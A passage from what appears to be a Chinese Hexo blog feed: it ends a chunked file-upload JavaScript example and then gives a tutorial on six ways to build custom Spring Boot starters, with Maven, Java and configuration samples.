class="keyword">return</span> start;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params">file, start</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> chunkSize = <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 每个分片1MB</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> total = <span class="title class_">Math</span>.<span class="title function_">ceil</span>((file.<span class="property">size</span> - start) / chunkSize);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> chunkStart = start + i * chunkSize;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> chunkEnd = <span class="title class_">Math</span>.<span class="title function_">min</span>(chunkStart + chunkSize, file.<span class="property">size</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> chunk = file.<span class="title function_">slice</span>(chunkStart, chunkEnd);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">            formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, chunk);</span></span><br><span class="line"><span class="language-javascript">            formData.<span class="title function_">append</span>(<span class="string">&#x27;start&#x27;</span>, chunkStart);</span></span><br><span class="line"><span class="language-javascript">            formData.<span class="title function_">append</span>(<span class="string">&#x27;fileName&#x27;</span>, file.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/file/upload2&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`分片 <span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;total&#125;</span> 上传成功`</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`分片 <span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;total&#125;</span> 上传失败: <span class="subst">$&#123;result&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>本文完整案例：<a href="https://github.com/lenve/springboot3-samples/tree/main/file_upload">https://github.com/lenve/springboot3-samples/tree/main/file_upload</a></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能七【自定义starter开发】</title>
    <url>/cnblogs.github.io/p/8cfd.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>方法</th>
<th>实现难度</th>
<th>灵活性</th>
<th>可配置性</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>基础配置类方式</td>
<td>★☆☆☆☆</td>
<td>★★☆☆☆</td>
<td>★☆☆☆☆</td>
<td>简单工具类封装</td>
</tr>
<tr>
<td>条件装配方式</td>
<td>★★☆☆☆</td>
<td>★★★☆☆</td>
<td>★★☆☆☆</td>
<td>环境敏感功能</td>
</tr>
<tr>
<td>属性绑定方式</td>
<td>★★★☆☆</td>
<td>★★★★☆</td>
<td>★★★★★</td>
<td>可配置组件</td>
</tr>
<tr>
<td>完全自动配置方式</td>
<td>★★★★☆</td>
<td>★★★★★</td>
<td>★★★★★</td>
<td>企业级复杂功能</td>
</tr>
<tr>
<td>Enable模式方式</td>
<td>★★★☆☆</td>
<td>★★★★☆</td>
<td>★★★☆☆</td>
<td>可选功能组件</td>
</tr>
<tr>
<td>模块化组合式方式</td>
<td>★★★★★</td>
<td>★★★★★</td>
<td>★★★★★</td>
<td>大型平台级应用</td>
</tr>
</tbody></table>
<h3 id="方法一：基础配置类方式"><a href="#方法一：基础配置类方式" class="headerlink" title="方法一：基础配置类方式"></a>方法一：基础配置类方式</h3><p>这是最简单的starter开发方法，通过创建一个包含@Configuration注解的配置类，使用@Bean方法定义需要注入的组件。</p>
<blockquote>
<p>实现步骤</p>
</blockquote>
<p>创建Maven项目：命名遵循xxx-spring-boot-starter格式<br>添加依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleServiceAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SimpleService <span class="title function_">simpleService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleServiceImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建自动配置文件：在resources&#x2F;META-INF&#x2F;spring.factories中添加：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span></span><br><span class="line"><span class="string">com.example.SimpleServiceAutoConfiguration</span></span><br></pre></td></tr></table></figure>
<p>使用方式<br>使用时只需要在项目中添加依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>simple-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>优缺点分析<br><strong>优点：</strong></p>
<ul>
<li>实现简单，上手容易</li>
<li>适合封装简单的功能组件</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>不支持定制化配置</li>
<li>无法根据条件选择性装配</li>
<li>功能过于简单，适用场景有限</li>
</ul>
<p>适用场景：适合封装简单的工具类或无需外部配置的功能组件。</p>
<h3 id="方法二：条件装配方式"><a href="#方法二：条件装配方式" class="headerlink" title="方法二：条件装配方式"></a>方法二：条件装配方式</h3><p>通过SpringBoot的条件装配机制，实现根据特定条件决定是否启用配置的starter。</p>
<blockquote>
<p>实现步骤</p>
</blockquote>
<p>创建Maven项目同上<br>创建配置类，添加条件注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(RedisTemplate.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisServiceAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="keyword">public</span> RedisService <span class="title function_">redisService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RedisServiceImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnProperty(prefix = &quot;redis.cache&quot;, name = &quot;enabled&quot;, havingValue = &quot;true&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> RedisCacheManager <span class="title function_">redisCacheManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RedisCacheManager</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置自动装配文件同上 条件注解说明<br>SpringBoot提供了丰富的条件注解：</p>
<ul>
<li>@ConditionalOnClass：当类路径下有指定类时</li>
<li>@ConditionalOnMissingBean：当容器中没有指定Bean时</li>
<li>@ConditionalOnProperty：当配置文件中有指定属性时</li>
<li>@ConditionalOnWebApplication：当应用是Web应用时</li>
<li>@ConditionalOnExpression：基于SpEL表达式的条件</li>
</ul>
<p>优缺点分析<br><strong>优点：</strong></p>
<ul>
<li>智能装配，避免无用组件加载</li>
<li>可以根据环境条件决定是否启用功能</li>
<li>防止与已有Bean冲突</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>配置逻辑较复杂</li>
<li>调试排错难度增加</li>
<li>需要考虑条件之间的优先级和冲突</li>
</ul>
<p>适用场景：适合需要根据环境条件选择性启用的功能组件，如根据是否是Web环境决定是否启用Web相关功能。</p>
<h3 id="方法三：属性绑定方式"><a href="#方法三：属性绑定方式" class="headerlink" title="方法三：属性绑定方式"></a>方法三：属性绑定方式</h3><p>通过@ConfigurationProperties实现自定义配置的starter，支持从配置文件中读取参数。</p>
<blockquote>
<p>实现步骤</p>
</blockquote>
<p>创建属性类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;example.service&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceProperties</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否启用服务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">enabled</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 服务URL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8080&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接超时时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">timeout</span> <span class="operator">=</span> <span class="number">3000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建自动配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(ServiceProperties.class)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;example.service&quot;, name = &quot;enabled&quot;, havingValue = &quot;true&quot;, matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleServiceAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ServiceProperties properties;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="keyword">public</span> ExampleService <span class="title function_">exampleService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ExampleServiceImpl</span>(properties.getUrl(), properties.getTimeout());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置元数据提示：创建META-INF&#x2F;spring-configuration-metadata.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.service.enabled&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Boolean&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Whether to enable example service.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.service.url&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Service URL.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.service.timeout&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Integer&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Connection timeout in milliseconds.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span><span class="punctuation">:</span> <span class="number">3000</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>优缺点分析<br><strong>优点：</strong></p>
<ul>
<li>支持从配置文件读取参数，实现灵活配置</li>
<li>配置项有元数据提示，用户体验好</li>
<li>支持配置校验和默认值</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>开发工作量增加</li>
<li>需要维护配置元数据</li>
<li>配置项过多时管理复杂</li>
</ul>
<p>适用场景：适合需要通过外部配置定制化的功能组件，如各种客户端和连接池配置。</p>
<h3 id="方法四：完全自动配置方式"><a href="#方法四：完全自动配置方式" class="headerlink" title="方法四：完全自动配置方式"></a>方法四：完全自动配置方式</h3><p>结合前面方法，实现一个完整的自动配置starter，包含条件装配、属性绑定和多组件配置。</p>
<blockquote>
<p>实现步骤</p>
</blockquote>
<p>创建多个组件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 核心服务接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ComplexService</span> &#123;</span><br><span class="line">    String <span class="title function_">process</span><span class="params">(String input)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComplexServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">ComplexService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String endpoint;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> timeout;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ComplexServiceImpl</span><span class="params">(String endpoint, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.endpoint = endpoint;</span><br><span class="line">        <span class="built_in">this</span>.timeout = timeout;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">process</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现逻辑</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Processed: &quot;</span> + input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceHelper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">assist</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 辅助功能实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建属性类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;complex.service&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComplexServiceProperties</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">enabled</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">endpoint</span> <span class="operator">=</span> <span class="string">&quot;http://api.example.com&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">timeout</span> <span class="operator">=</span> <span class="number">5000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">AdvancedConfig</span> <span class="variable">advanced</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvancedConfig</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AdvancedConfig</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">cacheEnabled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cacheSize</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建自动配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(ComplexServiceProperties.class)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;complex.service&quot;, name = &quot;enabled&quot;, havingValue = &quot;true&quot;, matchIfMissing = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComplexServiceAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ComplexServiceProperties properties;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="keyword">public</span> ComplexService <span class="title function_">complexService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ComplexServiceImpl</span>(</span><br><span class="line">            properties.getEndpoint(), </span><br><span class="line">            properties.getTimeout()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnProperty(prefix = &quot;complex.service.advanced&quot;, name = &quot;cache-enabled&quot;, havingValue = &quot;true&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CacheManager <span class="title function_">cacheManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleCacheManager</span>(properties.getAdvanced().getCacheSize());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServiceHelper <span class="title function_">serviceHelper</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServiceHelper</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加自动装配文件：在META-INF&#x2F;spring.factories中添加配置<br>优缺点分析<br><strong>优点：</strong></p>
<ul>
<li>功能完整，支持复杂场景</li>
<li>组件化设计，支持条件装配</li>
<li>灵活的配置选项</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>实现复杂度高</li>
<li>需要考虑多组件间的依赖关系</li>
</ul>
<p>适用场景：适合复杂的企业级功能组件，如分布式事务、安全认证等需要多组件协同工作的场景。</p>
<h3 id="方法五：Enable模式方式"><a href="#方法五：Enable模式方式" class="headerlink" title="方法五：Enable模式方式"></a>方法五：Enable模式方式</h3><p>通过自定义@Enable注解，允许用户主动启用特定功能。</p>
<blockquote>
<p>实现步骤</p>
</blockquote>
<p>创建功能接口和实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FeatureService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeatureServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">FeatureService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 实现逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建@Enable注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Import(FeatureConfiguration.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableFeature &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 模式设置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Mode <span class="title function_">mode</span><span class="params">()</span> <span class="keyword">default</span> Mode.SIMPLE;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">Mode</span> &#123;</span><br><span class="line">        SIMPLE, ADVANCED</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeatureConfiguration</span> <span class="keyword">implements</span> <span class="title class_">ImportAware</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> EnableFeature.Mode mode;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setImportMetadata</span><span class="params">(AnnotationMetadata importMetadata)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; attributes = importMetadata.getAnnotationAttributes(</span><br><span class="line">                EnableFeature.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.mode = (EnableFeature.Mode) attributes.get(<span class="string">&quot;mode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FeatureService <span class="title function_">featureService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mode == EnableFeature.Mode.SIMPLE) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleFeatureServiceImpl</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AdvancedFeatureServiceImpl</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用方式<br>在应用主类中使用@Enable注解启用功能：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeature(mode = EnableFeature.Mode.ADVANCED)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优缺点分析<br><strong>优点：</strong></p>
<ul>
<li>显式启用功能，使用意图明确</li>
<li>支持通过注解参数定制功能</li>
<li>可以与自动配置结合使用</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>需要用户主动添加注解</li>
<li>不完全符合SpringBoot开箱即用的理念</li>
<li>增加用户的使用负担</li>
</ul>
<p>适用场景：适合可选功能或有多种使用模式的功能组件，如特定的集成方案或可选功能增强。</p>
<h3 id="方法六：模块化与组合式starter"><a href="#方法六：模块化与组合式starter" class="headerlink" title="方法六：模块化与组合式starter"></a>方法六：模块化与组合式starter</h3><p>通过拆分功能模块，实现可组合的starter体系，用户可以按需引入所需功能。</p>
<blockquote>
<p>实现步骤</p>
</blockquote>
<p>创建基础模块：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">myproject-spring-boot-starter</span> <span class="string">(父模块)</span></span><br><span class="line"><span class="string">├──</span> <span class="string">myproject-core-spring-boot-starter</span> <span class="string">(核心功能)</span></span><br><span class="line"><span class="string">├──</span> <span class="string">myproject-web-spring-boot-starter</span> <span class="string">(Web功能)</span></span><br><span class="line"><span class="string">├──</span> <span class="string">myproject-cache-spring-boot-starter</span> <span class="string">(缓存功能)</span></span><br><span class="line"><span class="string">└──</span> <span class="string">myproject-security-spring-boot-starter</span> <span class="string">(安全功能)</span></span><br></pre></td></tr></table></figure>
<p>核心模块实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在core模块中</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(CoreService.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CoreAutoConfiguration</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="keyword">public</span> CoreService <span class="title function_">coreService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CoreServiceImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>功能模块实现：</p>
